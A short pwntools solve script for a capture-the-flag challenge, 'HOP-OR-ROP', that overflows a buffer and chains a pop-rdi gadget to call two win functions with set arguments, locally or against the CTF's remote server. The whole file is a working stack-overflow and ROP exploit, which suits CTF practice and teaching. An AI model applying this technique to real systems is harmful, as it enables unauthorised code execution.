# Challenge: https://backdoor.sdslabs.co/challenges/HOP-OR-ROP

from pwn import *

# SETTINGS
local = False
context.log_level = 'critical'

e = ELF("rop")
rop = ROP(e)

junk = "A" * 24       
POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret'])[0]    # 0x40134b
PARAM_1 = 0xcafebabe
# WIN_ONE = 0x401182
PARAM_2 = 0xdeadbeef
# WIN_TWO = 0x401204

WIN_ONE = e.functions['win_one'].address
WIN_TWO = e.functions['win_two'].address

#chain = "A" * 8 + "\x4b\x13\x41\x00\x00\x00\x00\x00" + "\xbe\xba\xfe\xca\x00\x00\x00\x00" + "\x82\x11\x40\x00\x00\x00\x00\x00"
chain = [POP_RDI_RET, PARAM_1, WIN_ONE, POP_RDI_RET, PARAM_2, WIN_TWO]
rop_chain = "".join([p64(r) for r in chain])

if local == True:
    p = process("rop")
    print(p.recvuntil('name??\n'))
    p.send(junk + rop_chain + '\n')
    print(p.recv())

if local == False:
    r = remote('hack.bckdr.in', 10169)
    print(r.recvuntil('name??\n'))
    r.send(junk + rop_chain + '\n')
    print(r.recvall())
    